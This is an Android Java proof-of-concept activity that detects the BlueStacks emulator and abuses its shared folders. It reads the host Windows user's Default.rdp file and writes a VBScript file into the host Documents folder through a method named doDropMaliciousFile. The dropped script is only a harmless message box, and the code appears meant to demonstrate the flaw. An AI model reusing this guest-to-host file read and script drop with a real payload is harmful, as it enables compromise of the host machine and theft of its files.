package com.github.thecjw.bluestacksdetector;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Click;
import org.androidannotations.annotations.EActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

@EActivity(R.layout.activity_launcher)
public class LauncherActivity extends Activity {

  private final String TAG = getClass().getName();

  private static final String hostPublicDocuments = "/windows/PublicDocuments";
  private static final String hostPublicPictures = "/windows/PublicPictures";
  private static final String hostCurrentDocuments = "/windows/Documents";
  private static final String hostCurrentPictures = "/windows/Pictures";
  private static final String hostBstSharedFolder = "/windows/BstSharedFolder";

  private static String knownBluestacksFiles[] = {
      "bstcmd_shim",
      "bstfolder_ctl",
      "bstfolderd",
      "bstshutdown",
      "bstshutdown_core"
  };

  /**
   * @return
   */
  boolean isRunningInBluestacks() {
    boolean status = false;
    for (String s : knownBluestacksFiles) {
      File file = new File("/system/bin/" + s);
      if (file.exists()) {
        status = true;
        break;
      }
    }

    String text = "No running in Bluestacks";
    if (status) {
      text = "Running in Bluestacks";
    }
    Toast.makeText(this, text, Toast.LENGTH_SHORT).show();

    return status;
  }

  @AfterViews
  void initView() {
    Log.i(TAG, "Init.");
  }

  @Click
  void doDetectBluestacks() {
    isRunningInBluestacks();
  }

  @Click
  void doReadHostFile() {
    try {
      if (!isRunningInBluestacks()) {
        return;
      }
      String hostFileName = Environment.getExternalStorageDirectory().getPath() + hostCurrentDocuments + "/Default.rdp";
      File file = new File(hostFileName);
      StringBuilder content = new StringBuilder();
      BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
      String line;
      while ((line = bufferedReader.readLine()) != null) {
        content.append(line);
        content.append("\n");
      }
      Toast.makeText(this, content, Toast.LENGTH_LONG).show();
    } catch (IOException e) {
      Log.i(TAG, e.getMessage());
    }
  }

  @Click
  void doDropMaliciousFile() {
    try {
      if (!isRunningInBluestacks()) {
        return;
      }
      String hostFileName = Environment.getExternalStorageDirectory().getPath() + hostCurrentDocuments + "/from_bluestacks.vbs";
      File file = new File(hostFileName);
      FileOutputStream outputStream = new FileOutputStream(file);
      String content = "MsgBox \"Hello, Bluestacks\", 0, \"test\"";
      outputStream.write(content.getBytes());
      outputStream.close();
    } catch (IOException e) {
      Log.i(TAG, e.getMessage());
    }
  }
}
